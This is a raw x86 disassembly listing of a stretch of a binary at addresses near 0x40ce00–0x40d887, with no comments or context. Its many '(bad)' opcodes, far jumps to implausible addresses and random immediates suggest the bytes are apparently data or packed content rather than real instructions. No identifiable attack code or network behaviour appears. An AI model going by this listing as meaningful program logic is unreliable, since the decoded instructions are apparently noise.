  40ce01:	fisub  WORD PTR [ebx]
  40ce03:	and    eax,0xa42c8d1
  40ce08:	leave  
  40ce09:	dec    esi
  40ce0a:	loope  0x40ce27
  40ce0c:	std    
  40ce0d:	leave  
  40ce0e:	lds    esp,FWORD PTR [esp]
  40ce11:	jl     0x40cdd1
  40ce13:	scas   al,BYTE PTR es:[edi]
  40ce14:	cmp    DWORD PTR [ebx-0x3756da91],esi
  40ce1a:	inc    edx
  40ce1b:	or     BYTE PTR [ecx-0x16e40eb2],ah
  40ce21:	leave  
  40ce22:	popf   
  40ce23:	and    al,0x26
  40ce25:	and    DWORD PTR ds:0xd3c989c3,esi
  40ce2b:	dec    esi
  40ce2c:	neg    BYTE PTR [ecx]
  40ce2e:	jmp    0x9193c157
  40ce33:	repnz add BYTE PTR [eax],al
	...
  40ce5e:	jb     0x40ce28
  40ce60:	push   DWORD PTR [ebp-0x3b]
  40ce63:	push   ds
  40ce64:	pop    esp
  40ce65:	sub    BYTE PTR [edx],bh
  40ce67:	xor    eax,DWORD PTR [edx]
  40ce69:	jmp    0xd53fa9ab
  40ce6e:	push   ebp
  40ce6f:	rcr    BYTE PTR [esi],0x54
  40ce72:	and    cl,al
  40ce74:	(bad)  
  40ce75:	aam    0x19
  40ce77:	enter  0xf174,0x55
  40ce7b:	mov    ebx,DWORD PTR [esi+edi*1+0x205e285a]
  40ce82:	jg     0x40cee3
  40ce84:	add    BYTE PTR [esi+eiz*4+0x6d2d80b7],dl
  40ce8b:	sar    dh,1
  40ce8d:	push   ds
  40ce8e:	mov    BYTE PTR [esi],bl
  40ce90:	cld    
  40ce91:	mov    ecx,0xe104e62
  40ce96:	rcl    BYTE PTR [ebx-0x18],1
  40ce99:	das    
  40ce9a:	ja     0x40cef7
  40ce9c:	add    dl,dh
  40ce9e:	jge    0x40cef8
  40cea0:	test   DWORD PTR [ebx+0x26005b3f],ebp
  40cea6:	mov    al,ds:0x3de8ffcf
  40ceab:	pop    ebx
  40ceac:	(bad)  
  40cead:	and    al,0x36
  40ceaf:	enter  0xe906,0x3d
  40ceb3:	xor    eax,0x353a4300
  40ceb8:	add    BYTE PTR [ebx+0x42],dl
  40cebb:	(bad)  
  40cebc:	inc    esp
  40cebd:	mov    ch,0xea
  40cebf:	(bad)  
  40cec0:	test   BYTE PTR [ebp+0x0],bh
	...
  40ceea:	add    BYTE PTR [eax],al
  40ceec:	inc    ebp
  40ceed:	enter  0x19fe,0x5d
  40cef1:	dec    esi
  40cef2:	clc    
  40cef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cef4:	mov    bh,0xc3
  40cef6:	out    0x81,eax
  40cef8:	rcr    BYTE PTR [edx+0x0],0xe2
  40cefc:	std    
  40cefd:	dec    esi
  40cefe:	add    eax,0x5d3780
  40cf03:	add    BYTE PTR [edi-0xd],ah
  40cf06:	scas   eax,DWORD PTR es:[edi]
  40cf07:	dec    eax
  40cf08:	es pop edi
  40cf0a:	push   DWORD PTR [ebp-0x79]
  40cf0d:	jae    0x40cef8
  40cf0f:	mov    eax,ds:0x8b507bd0
  40cf14:	pop    ss
  40cf15:	jmp    0x50ff:0x7be8f484
  40cf1c:	test   DWORD PTR [ebx-0x27],esi
  40cf1f:	mov    eax,ds:0x85897bf0
  40cf24:	ja     0x40cf88
  40cf26:	(bad)  
  40cf27:	dec    DWORD PTR [edi+0x70ff9cca]
  40cf2d:	cmc    
  40cf2e:	(bad)  
  40cf2f:	jcxz   0x40cf38
  40cf32:	inc    eax
  40cf33:	add    BYTE PTR [eax+0x24],ah
  40cf36:	lock div DWORD PTR [eax]
  40cf39:	jp     0x40cf3a
  40cf3b:	jne    0x40cf60
  40cf3d:	jae    0x40cf71
  40cf3f:	mov    eax,ds:0x85897a30
  40cf44:	dec    ebx
  40cf45:	(bad)  
  40cf46:	(bad)  
  40cf47:	dec    ebp
  40cf49:	pop    edx
  40cf4a:	push   0xfe9fd375
  40cf4f:	inc    BYTE PTR [eax]
	...
  40cf79:	add    BYTE PTR [edx],ch
  40cf7b:	outs   dx,DWORD PTR ds:[esi]
  40cf7c:	idiv   edi
  40cf7e:	loopne 0x40cff9
  40cf80:	jne    0x40cf8e
  40cf82:	out    dx,eax
  40cf83:	rcr    DWORD PTR [edi-0x7b280f01],0xec
  40cf8a:	call   0xa7abcf08
  40cf8f:	bnd jl 0x40cfee
  40cf92:	pop    di
  40cf94:	push   DWORD PTR [ebp-0x9e19]
  40cf9a:	shl    bl,1
  40cf9c:	or     ch,al
  40cf9e:	jecxz  0x40cfda
  40cfa0:	(bad)  
  40cfa1:	dec    DWORD PTR [esi]
  40cfa3:	shl    edi,cl
  40cfa5:	idiv   DWORD PTR [esi]
  40cfa7:	in     eax,dx
  40cfa8:	and    DWORD PTR [edx+0x3e],ebp
  40cfab:	pop    esp
  40cfac:	mov    ebx,DWORD PTR [edi+edi*8-0x4d]
  40cfb0:	and    DWORD PTR [ebp-0xddb292],esi
  40cfb6:	imul   eax,edi,0x145fe80e
  40cfbc:	and    bh,bh
  40cfbe:	(bad)  
  40cfbf:	aaa    
  40cfc0:	aas    
  40cfc1:	not    DWORD PTR [ecx+0x25]
  40cfc4:	nop
  40cfc5:	test   DWORD PTR [esi+0x25],ebx
  40cfc8:	and    bh,bh
  40cfca:	out    dx,al
  40cfcb:	fwait
  40cfcc:	jns    0x40d02a
  40cfce:	jg     0x40cf84
  40cfd0:	and    DWORD PTR [ebp-0xdd72d2],esi
  40cfd6:	sub    edi,eax
  40cfd8:	aaa    
  40cfd9:	dec    eax
  40cfda:	jg     0x40cf90
  40cfdc:	sub    bh,BYTE PTR [esi+0x0]
	...
  40d006:	add    BYTE PTR [eax],al
  40d008:	fidivr WORD PTR [edx+eiz*1+0xb]
  40d00c:	(bad)  
  40d00d:	out    dx,eax
  40d00e:	sti    
  40d00f:	or     bl,0x53
  40d012:	sbb    bh,bh
  40d014:	add    eax,eax
  40d016:	xchg   edi,eax
  40d017:	psubw  mm0,QWORD PTR [ebx]
  40d01a:	xchg   edx,eax
  40d01b:	test   DWORD PTR [esi],edx
  40d01d:	int    0x20
  40d01f:	dec    DWORD PTR [esi-0x1e6271a4]
  40d025:	mov    ah,0x2c
  40d027:	adc    al,0x45
  40d029:	hlt    
  40d02a:	xchg   edi,eax
  40d02b:	add    eax,0x9ca0ac6e
  40d030:	leave  
  40d031:	lods   al,BYTE PTR ds:[esi]
  40d032:	dec    eax
  40d033:	test   esi,esp
  40d035:	lods   al,BYTE PTR ds:[esi]
  40d036:	and    bh,bh
  40d038:	push   ebx
  40d039:	mov    ah,0x2
  40d03b:	add    bl,al
  40d03d:	ds xor al,0xf7
  40d040:	test   eax,0xdc67b40c
  40d045:	push   edi
  40d046:	ret    
  40d047:	call   FWORD PTR [eax-0x76eba3a6]
  40d04d:	lds    ebx,FWORD PTR [ebp-0x7ea8ecdf]
  40d053:	xchg   ebp,eax
  40d054:	mov    eax,ds:0xc38b8dc5
  40d059:	scas   al,BYTE PTR es:[edi]
  40d05a:	jge    0x40d07d
  40d05c:	jno    0x40d037
  40d05e:	cmp    ebp,DWORD PTR [eax]
  40d060:	jno    0x40d027
  40d062:	jne    0x40d068
  40d064:	xor    edi,ebx
  40d066:	push   ecx
  40d067:	add    al,0x3e
  40d069:	pop    ebx
  40d06a:	push   0x5f
	...
  40d094:	add    BYTE PTR [eax],al
  40d096:	(bad)  
  40d097:	int    0x5d
  40d099:	and    DWORD PTR [esi],edi
  40d09b:	push   esi
  40d09c:	ins    DWORD PTR es:[edi],dx
  40d09d:	xchg   edx,eax
  40d09e:	ds pop ebx
  40d0a0:	jmp    0x3df4cc29
  40d0a5:	and    DWORD PTR [ecx],esi
  40d0a7:	pop    esp
  40d0a8:	out    dx,al
  40d0a9:	xchg   DWORD PTR [edi-0x69fc16a5],edi
  40d0af:	imul   ebp,ecx,0x30
  40d0b2:	fadd   st,st(4)
  40d0b4:	fwait
  40d0b5:	or     esp,DWORD PTR [esi]
  40d0b7:	stos   BYTE PTR es:[edi],al
  40d0b8:	jg     0x40d0db
  40d0ba:	or     ebp,eax
  40d0bc:	pop    ebx
  40d0bd:	xor    BYTE PTR [ecx],cl
  40d0bf:	lds    ecx,FWORD PTR ds:0x11537321
  40d0c5:	jmp    0xb3b3:0x20fdc4d7
  40d0cc:	std    
  40d0cd:	and    cl,ah
  40d0cf:	les    esi,FWORD PTR [ebx+0xb]
  40d0d2:	out    0x63,al
  40d0d4:	and    DWORD PTR [eax],0xffffffd1
  40d0d7:	les    edx,FWORD PTR [ebx-0x2a3b2ed9]
  40d0dd:	and    BYTE PTR [ebx+0x53],cl
  40d0e0:	ror    DWORD PTR ds:0x20c5c4d4,0xeb
  40d0e7:	mov    ds:0xc4a920b5,eax
  40d0ec:	(bad)  
  40d0ed:	cmp    esi,DWORD PTR [edx]
  40d0ef:	mov    bl,0x99
  40d0f1:	push   eax
  40d0f2:	pop    esi
  40d0f3:	(bad)  
  40d0f4:	(bad)  
  40d0f5:	pop    esp
  40d0f6:	push   ecx
  40d0f7:	int3   
  40d0f8:	(bad)  
  40d0f9:	sahf   
	...
  40d122:	add    BYTE PTR [eax],al
  40d124:	pop    esi
  40d125:	dec    esi
  40d126:	or     BYTE PTR [ecx-0x71011db1],al
  40d12c:	ret    0xd406
  40d12f:	jle    0x40d14f
  40d131:	(bad)  
  40d132:	push   esp
  40d134:	push   0xffffffd9
  40d136:	mov    esp,0xfec44699
  40d13b:	in     eax,0xb0
  40d13d:	push   0xffffff8b
  40d13f:	ins    BYTE PTR es:[edi],dx
  40d140:	or     esp,ecx
  40d142:	(bad)  
  40d143:	pop    esi
  40d144:	push   ds
  40d145:	mov    edi,edi
  40d147:	fdiv   QWORD PTR ds:0x5e7069b3
  40d14d:	(bad)  
  40d14e:	jmp    0x35b4:0xfdc3e3f3
  40d155:	mov    bl,0x5d
  40d157:	push   eax
  40d158:	pop    esi
  40d159:	(bad)  
  40d15a:	(bad)  
  40d15b:	je     0x40d1be
  40d15d:	int3   
  40d15e:	(bad)  
  40d15f:	es gs stc 
  40d162:	fwait
  40d163:	push   ds
  40d164:	pop    esi
  40d165:	les    esi,FWORD PTR [ebp+eax*1+0x1fec426]
  40d16c:	jbe    0x40d155
  40d16e:	inc    BYTE PTR [esi]
  40d170:	push   ds
  40d171:	push   cs
  40d172:	call   0xe8051b6d
  40d177:	gs popa 
  40d179:	(bad)  
  40d17a:	(bad)  
  40d17b:	out    dx,al
  40d17c:	jae    0x40d125
  40d17e:	mul    dh
  40d180:	xor    DWORD PTR [ebx-0x3bd68280],esi
  40d186:	(bad)  
  40d187:	pushf  
	...
  40d1b0:	add    BYTE PTR [eax],al
  40d1b2:	push   es
  40d1b3:	int3   
  40d1b4:	dec    dh
  40d1b6:	push   0x4d
  40d1b8:	pushf  
  40d1b9:	add    BYTE PTR [eax+0x63],bh
  40d1bc:	push   DWORD PTR [ebp-0x9419]
  40d1c2:	call   0x533fdca8
  40d1c7:	push   edi
  40d1c8:	call   0xffa4ac86
  40d1cd:	push   edx
  40d1cf:	outs   dx,BYTE PTR ds:[esi]
  40d1d0:	idiv   edi
  40d1d2:	test   al,0x76
  40d1d4:	pop    edx
  40d1d5:	pushf  
  40d1d6:	enter  0xff63,0x45
  40d1da:	mov    edi,0xe8fdcd75
  40d1df:	arpl   di,di
  40d1e1:	jne    0x40d1ce
  40d1e3:	jbe    0x40d25b
  40d1e5:	mov    BYTE PTR [edi+0x57],ah
  40d1e8:	leave  
  40d1e9:	ret    0x574b
  40d1ec:	push   ebp
  40d1ed:	mov    edi,ebx
  40d1ef:	xlat   BYTE PTR ds:[ebx]
  40d1f0:	ret    
  40d1f1:	cld    
  40d1f2:	jge    0x40d24b
  40d1f4:	push   0x1c
  40d1f6:	mov    ah,ah
  40d1f8:	push   es
  40d1f9:	call   0x401209
  40d1fe:	scas   al,BYTE PTR es:[edi]
  40d1ff:	xchg   esp,eax
  40d200:	cli    
  40d201:	push   0x3f9bba
  40d206:	push   0xe648d3a4
  40d20b:	pop    esi
  40d20c:	push   DWORD PTR [ebp+0xf]
  40d20f:	ja     0x40d283
  40d211:	std    
  40d212:	sub    BYTE PTR [edx+0x68],ah
  40d215:	lods   eax,DWORD PTR ds:[esi]
	...
  40d23e:	add    BYTE PTR [eax],al
  40d240:	stos   DWORD PTR es:[edi],eax
  40d241:	xchg   edi,eax
  40d242:	(bad)  
  40d243:	addr16 in eax,0x5e
  40d246:	add    BYTE PTR [eax-0x17f91c18],al
  40d24c:	mov    bh,0x7b
  40d24e:	(bad)  
  40d24f:	(bad)  
  40d250:	call   0x7340cd38
  40d255:	dec    edi
  40d256:	call   0xffa290da
  40d25b:	leave  
  40d25c:	test   BYTE PTR ds:[esi],0x0
  40d260:	adc    edi,DWORD PTR ds:0x7a812f
  40d266:	sbb    eax,0x42ea9ff
  40d26b:	push   0x43
  40d26d:	or     DWORD PTR [eax+0x7d54a607],ebx
  40d273:	call   DWORD PTR [ecx+0x16fbc84b]
  40d279:	mov    eax,0x373e0003
  40d27e:	mov    bh,dh
  40d280:	js     0x40d253
  40d282:	sbb    eax,0x85c26650
  40d287:	add    BYTE PTR [esi],bh
  40d289:	int    0x42
  40d28b:	je     0x40d29f
  40d28d:	pop    es
  40d28e:	pop    es
  40d28f:	add    DWORD PTR [esi],edi
  40d291:	mov    ah,0x95
  40d293:	and    al,0xe6
  40d295:	outs   dx,BYTE PTR ds:[esi]
  40d296:	mov    edi,0x882f3e40
  40d29b:	test   DWORD PTR [eax+0x29],0x926501e
  40d2a2:	jle    0x40d2a3
	...
  40d2cc:	add    BYTE PTR [eax],al
  40d2ce:	xor    esp,esp
  40d2d0:	stos   BYTE PTR es:[edi],al
  40d2d1:	jmp    FWORD PTR [ecx]
  40d2d3:	adc    DWORD PTR [ebp+0x50],ebx
  40d2d6:	and    edi,edi
  40d2d8:	or     ch,al
  40d2da:	shl    BYTE PTR [edx+0x1e],1
  40d2dd:	jmp    DWORD PTR [esi]
  40d2df:	adc    BYTE PTR [edx-0x1],bh
  40d2e2:	or     DWORD PTR [ecx-0x68],esp
  40d2e5:	sti    
  40d2e6:	add    edi,ebx
  40d2e8:	or     ch,al
  40d2ea:	push   ecx
  40d2eb:	dec    ebx
  40d2ec:	push   ds
  40d2ed:	inc    DWORD PTR [edi]
  40d2ef:	jbe    0x40d2f8
  40d2f1:	add    BYTE PTR [ebx-0x57cd0b3],dl
  40d2f7:	(bad)  
  40d2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2f9:	jmp    DWORD PTR [edi-0x6e]
  40d2fc:	sbb    eax,0xd15b4675
  40d301:	pop    ecx
  40d302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d303:	rcr    ebp,0x8b
  40d306:	jnp    0x40d2c7
  40d308:	inc    eax
  40d309:	add    al,0x3e
  40d30b:	mov    dl,0x8e
  40d30d:	lods   al,BYTE PTR ds:[esi]
  40d30e:	mov    WORD PTR [esi],ds
  40d310:	sub    BYTE PTR [esi+edx*1],al
  40d313:	mov    ds:0xc0a1c31c,al
  40d318:	cmp    ecx,DWORD PTR [esi+eiz*4]
  40d31b:	clc    
  40d31c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d31d:	sbb    eax,0x201bc191
  40d322:	mov    DWORD PTR [edi-0xf],eax
  40d325:	sub    esp,DWORD PTR [edx-0x1e]
  40d328:	xchg   ebp,eax
  40d329:	sbb    eax,0x3e49c87
  40d32e:	or     edx,esi
  40d330:	xchg   esp,eax
  40d331:	add    DWORD PTR [eax],0x0
	...
  40d35c:	and    BYTE PTR [esi-0x309ee28b],0x2b
  40d363:	and    dh,ch
  40d365:	shl    ebx,0xf3
  40d368:	push   eax
  40d369:	inc    edi
  40d36a:	cmc    
  40d36b:	sub    edx,edx
  40d36d:	fld1   
  40d36f:	add    esi,DWORD PTR ds:0x3286e59b
  40d375:	pop    ebx
  40d376:	jmp    0x4157cc7e
  40d37b:	add    al,0x3e
  40d37d:	pop    ebx
  40d37e:	jmp    0x36084ec7
  40d383:	add    eax,0x3c35b3e
  40d388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d389:	pop    ebx
  40d38a:	xchg   ebx,eax
  40d38b:	add    edx,DWORD PTR [ebx+ebx*2+0x2c0dc76c]
  40d392:	fs xchg edx,esi
  40d395:	enter  0x1d0d,0x8e
  40d399:	sar    BYTE PTR [ebx+0x1b],0xe9
  40d39d:	inc    esi
  40d39e:	std    
  40d39f:	sub    edi,DWORD PTR [eax-0x28]
  40d3a2:	(bad)  
  40d3a3:	call   0x760127e5
  40d3a8:	cmp    BYTE PTR [edx+0x5b3de8b6],dh
  40d3ae:	push   0x1bf598
  40d3b3:	(bad)  
  40d3b4:	rcl    BYTE PTR [eax-0x18],1
  40d3b7:	jbe    0x40d3ec
  40d3b9:	sar    dh,0x19
  40d3bc:	mov    bh,0xab
  40d3be:	mov    WORD PTR [eax+eax*1+0x0],fs
	...
  40d3ea:	dec    ecx
  40d3eb:	enter  0xb6fe,0xcd
  40d3ef:	sub    ch,al
  40d3f1:	adc    ax,ax
  40d3f4:	(bad)  
  40d3f5:	jo     0x40d3b7
  40d3f7:	retf   
  40d3f8:	neg    BYTE PTR [esi+0x73dcb322]
  40d3fe:	pop    edx
  40d3ff:	ror    BYTE PTR [esp+eiz*2-0x790137e3],0xad
  40d407:	cmp    cl,ch
  40d409:	sbb    eax,0x3cfdc07d
  40d40e:	sub    eax,0x326efec8
  40d413:	inc    esi
  40d414:	or     al,0x51
  40d416:	push   es
  40d417:	fdivp  st(6),st
  40d419:	pop    esi
  40d41a:	mov    ah,0xd6
  40d41c:	jecxz  0x40d47c
  40d41e:	pop    edx
  40d41f:	shr    BYTE PTR [ecx-0x17],0xe5
  40d423:	leave  
  40d424:	pop    ebx
  40d425:	test   al,0x3d
  40d427:	shl    BYTE PTR [ecx+edi*1+0x36fec04a],0xb0
  40d42f:	push   ebx
  40d430:	call   0xff01645e
  40d435:	jo     0x40d3f7
  40d437:	scas   al,BYTE PTR es:[edi]
  40d438:	neg    BYTE PTR [esi]
  40d43a:	and    dh,BYTE PTR ds:0x1f538100
  40d440:	inc    ecx
  40d441:	jmp    0x130da98
  40d446:	call   0x6b40d3ae
  40d44b:	push   eax
  40d44c:	call   0x40d4f6
	...
  40d475:	add    BYTE PTR [eax],al
  40d477:	add    BYTE PTR [edx+0x5f],dh
  40d47a:	dec    DWORD PTR [ecx-0x88ba6]
  40d480:	loopne 0x40d472
  40d482:	(bad)  
  40d483:	addr16 loopne 0x40d488
  40d486:	inc    eax
  40d487:	add    BYTE PTR [eax-0x7f080fd7],dl
  40d48d:	arpl   di,di
  40d48f:	jne    0x40d444
  40d491:	jae    0x40d41d
  40d493:	popf   
  40d494:	loopne 0x40d4f9
  40d496:	mov    DWORD PTR [ebp-0x944d],eax
  40d49c:	std    
  40d49d:	push   esi
  40d49e:	push   0xfe96020d
  40d4a3:	(bad)  
  40d4a4:	jmp    0x7563:0xd0fff766
  40d4ab:	or     al,0xbf
  40d4ad:	repz fwait
  40d4af:	inc    eax
  40d4b1:	int    0x84
  40d4b3:	fsubr  st,st(0)
  40d4b5:	arpl   di,di
  40d4b7:	push   0x67
  40d4b9:	repz inc edi
  40d4bb:	pop    ebp
  40d4bc:	es push edi
  40d4be:	push   DWORD PTR [ebp-0x9419]
  40d4c4:	loopne 0x40d4af
  40d4c6:	or     ch,al
  40d4c8:	sti    
  40d4c9:	inc    ebx
  40d4ca:	(bad)  
  40d4cb:	call   FWORD PTR [esi-0x7f082c24]
  40d4d1:	bound  eax,QWORD PTR [ebx-0x958443]
  40d4d7:	jmp    DWORD PTR [edi]
  40d4d9:	iret   
  40d4da:	ja     0x40d45f
	...
  40d504:	add    BYTE PTR [eax],al
  40d506:	mov    ds:0x60fff773,al
  40d50b:	push   edi
  40d50c:	je     0x40d57e
  40d50e:	xchg   esp,eax
  40d50f:	and    al,0xe8
  40d511:	idiv   DWORD PTR [esi]
  40d513:	sbb    eax,DWORD PTR gs:[eax]
  40d516:	push   0xffffffd5
  40d518:	stos   BYTE PTR es:[edi],al
  40d519:	(bad)  
  40d51b:	gs pop edx
  40d51d:	jmp    FWORD PTR [ebx-0x34]
  40d520:	sub    bh,BYTE PTR [edi-0xe63a50]
  40d526:	mov    eax,eax
  40d528:	adc    edi,edi
  40d52a:	leave  
  40d52b:	mov    ch,0x8f
  40d52d:	pop    es
  40d52e:	(bad)  
  40d52f:	shl    DWORD PTR [ecx-0x1],0xb9
  40d533:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d534:	dec    edi
  40d535:	call   0xff5a62e3
  40d53a:	xor    ecx,esp
  40d53c:	sub    al,BYTE PTR ds:0xff19fdc9
  40d542:	rcl    DWORD PTR [ecx+edx*1+0x4fed91ff],cl
  40d549:	in     al,0x91
  40d54b:	cmc    
  40d54c:	sbb    edi,edi
  40d54e:	or     ecx,esp
  40d550:	sub    al,ch
  40d552:	shl    ch,1
  40d554:	sbb    edi,edi
  40d556:	stos   DWORD PTR es:[edi],eax
  40d557:	or     al,0x12
  40d559:	jmp    FWORD PTR [ecx-0x2b]
  40d55c:	pop    DWORD PTR [edi]
  40d55e:	push   esi
  40d55f:	shl    DWORD PTR [eax-0x1],1
  40d562:	pop    ecx
  40d563:	inc    ebp
  40d564:	push   eax
  40d565:	fmul   QWORD PTR [ecx+0x2d]
  40d568:	sbb    bh,bh
	...
  40d592:	add    BYTE PTR [eax],al
  40d594:	ror    ebx,cl
  40d596:	sub    dl,ch
  40d598:	test   al,0x1d
  40d59a:	sbb    bh,bh
  40d59c:	repz jg 0x40d5b1
  40d59f:	push   DWORD PTR [ecx]
  40d5a1:	or     eax,0x6d160790
  40d5a6:	jno    0x40d5a7
  40d5a8:	and    DWORD PTR [ebp+0x50],edi
  40d5ab:	in     al,0x11
  40d5ad:	test   DWORD PTR [edx],ebx
  40d5af:	call   0xff5b009b
  40d5b4:	or     DWORD PTR [ebx+0x5c],ebx
  40d5b7:	daa    
  40d5b8:	or     DWORD PTR [esi-0x1c27d4e3],edi
  40d5be:	adc    eax,0x107f11a
  40d5c3:	adc    ch,cl
  40d5c5:	mov    ebp,0xbdc77610
  40d5ca:	std    
  40d5cb:	sbb    DWORD PTR [ebx-0x2ee60262],edx
  40d5d1:	mov    dl,0x60
  40d5d3:	jl     0x40d59e
  40d5d5:	mov    ebp,0xc5e64fe5
  40d5da:	fstp   QWORD PTR [ecx]
  40d5dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5dd:	aas    
  40d5de:	jo     0x40d5f9
  40d5e0:	mov    cl,0xbd
  40d5e2:	xchg   ebx,eax
  40d5e3:	xor    BYTE PTR [ecx+0x2c2cc5bd],dh
  40d5e9:	in     al,0xbd
  40d5eb:	sbb    DWORD PTR [ecx-0x6eee46f9],ebx
  40d5f1:	mov    ebp,0xbe358fad
  40d5f6:	sbb    ecx,DWORD PTR [eax+eax*1]
	...
  40d621:	add    BYTE PTR [esi+0x79199f55],dl
  40d627:	mov    ebp,0xbd69145b
  40d62c:	lea    ebp,[eax+edx*1]
  40d62f:	in     al,0x85
  40d631:	sbb    DWORD PTR [ecx+0x17],esp
  40d634:	sub    DWORD PTR [ebx],0x1975bd35
  40d63a:	push   ecx
  40d63b:	inc    edi
  40d63c:	ins    DWORD PTR es:[edi],dx
  40d63d:	sub    al,0xcc
  40d63f:	xlat   BYTE PTR ds:[ebx]
  40d640:	call   0xecd94d48
  40d645:	add    edx,DWORD PTR [ebx-0x57abb30]
  40d64b:	mov    edi,0x5c9403c2
  40d650:	inc    esi
  40d651:	(bad)  
  40d652:	cmp    DWORD PTR [ebx-0x42e68e30],esi
  40d658:	call   FWORD PTR [edi-0x2f]
  40d65b:	shl    BYTE PTR [edi-0x25],0xd0
  40d65f:	sbb    eax,DWORD PTR [eax]
  40d661:	es icebp 
  40d663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d664:	inc    edi
  40d665:	test   al,0x3d
  40d667:	mov    esp,0x9b25e174
  40d66c:	cld    
  40d66d:	push   cs
  40d66e:	inc    edi
  40d66f:	xor    edx,DWORD PTR [edx]
  40d671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d672:	cld    
  40d673:	mov    esp,0x5b3deb66
  40d678:	xor    dh,0xc0
  40d67b:	push   esp
  40d67c:	call   0xfefd07c0
  40d681:	out    0xb0,al
  40d683:	sar    dh,0x54
	...
  40d6ae:	add    BYTE PTR [eax],al
  40d6b0:	dec    edx
  40d6b1:	mov    bl,0x7a
  40d6b3:	jg     0x40d70b
  40d6b5:	mov    esp,0xbca9abc8
  40d6ba:	push   ebx
  40d6bb:	jb     0x40d716
  40d6bd:	fadd   st,st(3)
  40d6bf:	mov    ebp,0xe96a25cf
  40d6c4:	jecxz  0x40d722
  40d6c6:	push   DWORD PTR [edx+edi*1]
  40d6c9:	mov    bl,0x1c
  40d6cb:	jg     0x40d6f3
  40d6cd:	mov    esp,0xd0562488
  40d6d2:	xor    al,0x30
  40d6d4:	sbb    BYTE PTR [ebx],0x0
  40d6d7:	bound  edx,QWORD PTR [eax+0x3a28481f]
  40d6dd:	fstp   TBYTE PTR [esi]
  40d6df:	jmp    0x9a912ad
  40d6e4:	mov    DWORD PTR [ebx],ebx
  40d6e6:	add    BYTE PTR [edi],dl
  40d6e8:	sbb    al,BYTE PTR [ecx+0x2b3de985]
  40d6ee:	push   0x1af0b5
  40d6f3:	mov    esi,0xe9856d65
  40d6f8:	cmp    eax,0x57000b21
  40d6fd:	int    0x2
  40d6ff:	or     esi,DWORD PTR ds:0x7f5628cc
  40d705:	in     eax,0xa0
  40d707:	call   FWORD PTR [eax-0x10]
  40d70a:	push   0x5d
  40d70c:	(bad)  
  40d70d:	push   edi
  40d70e:	push   eax
  40d70f:	call   0x401b88
	...
  40d73c:	add    BYTE PTR [eax],al
  40d73e:	mov    bh,0xef
  40d740:	(bad)  
  40d741:	(bad)  
  40d742:	call   0x9aa83f69
  40d747:	cwde   
  40d748:	dec    BYTE PTR [edi-0x28]
  40d74b:	int    0x6
  40d74d:	call   0x3ff09b
  40d752:	aas    
  40d753:	fist   DWORD PTR [edi+0x16fd8ff]
  40d759:	inc    esi
  40d75a:	daa    
  40d75b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d75c:	(bad)  
  40d75d:	je     0x40d6ec
  40d75f:	cld    
  40d760:	cli    
  40d761:	xor    edx,edi
  40d763:	sbb    eax,0x6378ffff
  40d768:	repnz scas al,BYTE PTR es:[edi]
  40d76a:	aas    
  40d76b:	mov    esp,0xe9c89f73
  40d770:	cli    
  40d771:	call   DWORD PTR [edx+0x4f]
  40d774:	call   0xffa4da5c
  40d779:	pop    edi
  40d77a:	cmp    DWORD PTR [esi],ecx
  40d77c:	ret    0x6704
  40d77f:	or     cl,BYTE PTR [edx-0x3e52b14]
  40d785:	jmp    DWORD PTR [edx+0x53]
  40d788:	push   DWORD PTR [ebp+0x4f]
  40d78b:	outs   dx,DWORD PTR ds:[esi]
  40d78c:	cli    
  40d78d:	xchg   edx,eax
  40d78e:	enter  0x8963,0x45
  40d792:	(bad)  [ebx+0x75]
  40d795:	cld    
  40d796:	fsubr  st,st(1)
  40d798:	push   es
  40d799:	call   0x40069b
  40d79e:	ds cmp eax,0xbc9
	...
  40d7cc:	xor    eax,0xbd419084
  40d7d1:	pop    ebx
  40d7d2:	add    al,0x74
  40d7d4:	pop    ebx
  40d7d5:	jns    0x40d768
  40d7d7:	sti    
  40d7d8:	es push es
  40d7da:	jnp    0x40d7db
  40d7dc:	or     ebp,edx
  40d7de:	adc    eax,0x91813275
  40d7e3:	sti    
  40d7e4:	mov    ds,WORD PTR [ecx-0x6f]
  40d7e7:	pop    es
  40d7e8:	out    0x26,al
  40d7ea:	jb     0x40d7eb
  40d7ec:	jmp    0x328e61df
  40d7f1:	inc    ebp
  40d7f2:	(bad)  
  40d7f4:	push   edx
  40d7f5:	scas   al,BYTE PTR es:[edi]
  40d7f6:	mov    al,0xe7
  40d7f8:	inc    ebx
  40d7f9:	or     al,0x17
  40d7fb:	call   DWORD PTR ds:0xbd142b84
  40d801:	aas    
  40d802:	hlt    
  40d803:	jmp    FWORD PTR ds:0x4e4589ac
  40d809:	xchg   ecx,eax
  40d80a:	(bad)  
  40d80b:	sti    
  40d80c:	mov    ecx,0x95c289c4
  40d811:	(bad)  
  40d812:	jmp    0x7475fd6
  40d817:	add    bl,ch
  40d819:	cmp    al,0x27
  40d81b:	call   DWORD PTR [ebx]
  40d81d:	cwde   
  40d81e:	adc    eax,0x85cc3675
  40d823:	xchg   edx,eax
  40d824:	jns    0x40d7ff
  40d826:	adc    eax,0x17744275
  40d82b:	jne    0x40d863
  40d82d:	fdiv   st(5),st
  40d82f:	xchg   edx,eax
	...
  40d858:	add    BYTE PTR [eax],al
  40d85a:	popa   
  40d85b:	loope  0x40d8a8
  40d85d:	ret    0xc446
  40d860:	scas   eax,DWORD PTR es:[edi]
  40d861:	mov    ah,BYTE PTR [edx+0x45]
  40d864:	aas    
  40d865:	shl    al,0x50
  40d868:	mov    bl,0x82
  40d86a:	ret    
  40d86b:	pop    edx
  40d86c:	icebp  
  40d86d:	add    esi,DWORD PTR [edx+0x45986a4d]
  40d873:	pop    ebx
  40d874:	fld    QWORD PTR [edi]
  40d876:	mov    ebp,0xaa03f937
  40d87b:	popa   
  40d87c:	push   0xffffff98
  40d87e:	sub    eax,0x650cb45b
  40d883:	fwait
  40d884:	xchg   ecx,eax
  40d885:	mov    dh,0x6b
  40d887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
